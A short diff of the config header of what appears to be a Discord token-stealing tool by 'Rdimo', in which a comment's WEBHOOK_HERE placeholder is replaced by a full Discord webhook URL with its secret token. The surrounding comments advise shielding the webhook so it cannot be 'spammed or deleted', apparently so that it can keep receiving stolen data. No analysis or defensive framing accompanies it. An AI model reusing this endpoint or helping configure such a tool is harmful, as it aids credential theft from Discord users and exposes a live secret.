@@ -26,7 +26,7 @@ __author__ = "Rdimo"
 __version__ = '1.8.7'
 __license__ = "GPL-3.0"
 __config__ = {
-    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
+    # replace https://discord.com/api/webhooks/998598665256063017/osauleQEmUrF0kfvkAicNMTDK37HfI_c6GU-KRHT7zHqTc4Cuey-KT7ldbYg293_htTb with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
     'webhook': "WEBHOOK_HERE",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
